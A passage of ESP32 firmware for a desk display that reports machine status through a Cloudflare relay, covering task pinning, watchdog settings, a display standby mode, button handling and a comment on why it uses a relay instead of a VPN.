  //   WebServer::handleClient() waits up to HTTP_MAX_DATA_WAIT (5 s) for a
  //   client that connected and did not finish its request. Captive-portal
  //   probes do exactly that the moment a phone joins the access point.
  //   HTTPClient over TLS waits up to HTTP_TIMEOUT_MS (8 s) for a slow relay.
  //
  //   Either blocks INSIDE the call, so no amount of vTaskDelay() between
  //   loop iterations helps; IDLE0 simply never runs, the watchdog fires at
  //   5 s, and the device reboots in a loop that looks like a crash.
  //
  // Core 1's watchdog stays on, and that is the one worth having: nothing on
  // the UI core is ever allowed to block, so if IDLE1 starves it is a genuine
  // bug rather than a network call doing its job. The network side keeps its
  // own liveness check - MAX_CONSECUTIVE_FAILURES still forces a restart.
  disableCore0WDT();

  // Core 0: everything that can block. Core 1: everything that must not.
  // 16 KB rather than 10: an mbedTLS handshake for the relay transport is
  // stack-hungry, and overflowing it shows up as a boot loop rather than an
  // error message.
  xTaskCreatePinnedToCore(g_setup_mode ? setupTask : netTask,
                          "net", 16384, NULL, 1, NULL, 0);
  xTaskCreatePinnedToCore(uiTask, "ui", 8192, NULL, 2, NULL, 1);
}

// Deep sleep, entered by holding the right button. The panel has to be told
// to sleep separately: cutting the backlight alone leaves the controller
// driving a dark screen at full current, which is most of what there is to
// save on a board with no other peripherals.
// Standby, not deep sleep. Deep sleep on an ESP32 ends in a reset: the chip
// comes back through setup(), rejoins WiFi, re-syncs NTP and lands on the
// first page - so "wake" meant "reboot and lose your place", which is what it
// looked like.
//
// This keeps RAM, the WiFi association and the whole UI exactly as they were.
// The cost is real - standby draws milliamps where deep sleep draws
// microamps - but the backlight is the dominant load on this board by a wide
// margin, and turning that off plus stopping the polling is most of the
// saving. For a mains-powered desk gadget that is the right trade; for a
// month on a battery it would not be.
//
// Nothing here touches LVGL: this runs in loop(), on core 1 beside the UI
// task, so it sets a flag and lets that task stand down on its own.
static void enter_standby() {
  Serial.println("[peek] standby - press the right button to wake");

  g_standby = true;
  vTaskDelay(pdMS_TO_TICKS(60));   // let uiTask finish the frame it is drawing

  backlight_set(0);
  tft.writecommand(0x28);          // DISPOFF
  tft.writecommand(0x10);          // SLPIN

  // The press that started this has to end before the release can mean
  // anything, or the same hold would wake it again immediately.
  while (digitalRead(PIN_BTN_R) == LOW) vTaskDelay(pdMS_TO_TICKS(10));
  vTaskDelay(pdMS_TO_TICKS(80));   // contact bounce

  while (digitalRead(PIN_BTN_R) == HIGH) vTaskDelay(pdMS_TO_TICKS(25));

  tft.writecommand(0x11);          // SLPOUT
  delay(120);                      // the ST7789 wants ~120 ms out of sleep
  tft.writecommand(0x29);          // DISPON
  backlight_set(BL_LEVELS[cfg.bl_idx]);

  g_standby = false;
  // The numbers on screen are as old as the standby was long. Ask for a fresh
  // reading rather than showing a stale one and calling it live.
  g_force = true;
  Serial.println("[peek] awake");

  // Do not let the press that woke it also register as a brightness tap.
  while (digitalRead(PIN_BTN_R) == LOW) vTaskDelay(pdMS_TO_TICKS(10));
}

void loop() {
  // Buttons only. This runs on core 1 alongside uiTask, so it must not call
  // into LVGL - it sets flags and pokes the backlight, nothing more.
  static uint32_t left_down   = 0;
  static bool     left_fired  = false;
  static uint32_t right_down  = 0;
  static bool     right_fired = false;

  const uint32_t now = millis();

  // --- left: tap to swipe machines, hold to drop into setup mode ---
  if (digitalRead(PIN_BTN_L) == LOW) {
    if (!left_down) {
      left_down  = now;
      left_fired = false;
    } else if (!left_fired && now - left_down > SETUP_HOLD_MS && !g_setup_mode) {
      left_fired = true;
      Serial.println("[peek] entering setup mode");
      request_setup_mode();
    }
  } else {
    if (left_down && !left_fired && now - left_down > 30) {
      // Swiping costs nothing - the poll already carried every machine, and
      // the power page is local. Asking the relay again on each tap would
      // multiply the request budget by how restless someone is feeling.
      g_view_step = 1;
    }
    left_down = 0;
  }

  // --- right: tap for brightness, hold to sleep ---
  if (digitalRead(PIN_BTN_R) == LOW) {
    if (!right_down) {
      right_down  = now;
      right_fired = false;
    } else if (!right_fired && now - right_down > SLEEP_HOLD_MS && !g_setup_mode) {
      // Not in setup mode: sleeping there would take the configuration portal
      // down mid-form, and the way out would be a power cycle.
      right_fired = true;
      enter_standby();
    }
  } else {
    if (right_down && !right_fired && now - right_down > 30) {
      cfg.bl_idx = (cfg.bl_idx + 1) % BL_LEVEL_COUNT;
      backlight_set(BL_LEVELS[cfg.bl_idx]);
      config_save_backlight();
    }
    right_down = 0;
  }

  // A reboot requested from the dashboard side lands here; the setup portal
  // handles its own inside setupTask so it can shut the server down first.
  if (!g_setup_mode && g_reboot_at && (int32_t)(now - g_reboot_at) >= 0) {
    esp_restart();
  }

  vTaskDelay(pdMS_TO_TICKS(20));
}

/* ============================================================================
 *  Why a relay rather than a VPN
 * ----------------------------------------------------------------------------
 *  An ESP32 cannot join a Tailscale network: Tailscale is WireGuard plus a
 *  control plane - node registration, rotating keys, NAT traversal, DERP
 *  relays - and none of that has an embedded client.
 *
 *  A plain WireGuard tunnel was possible, and this firmware used to do it, but
 *  it needs the monitored host to accept an inbound connection. Behind CGNAT,
 *  or on a network you do not administer, that option simply does not exist.
 *  Pushing through a Cloudflare Worker instead means both ends only ever dial
 *  out, which works everywhere the tunnel did and everywhere it did not.
 * ==========================================================================*/
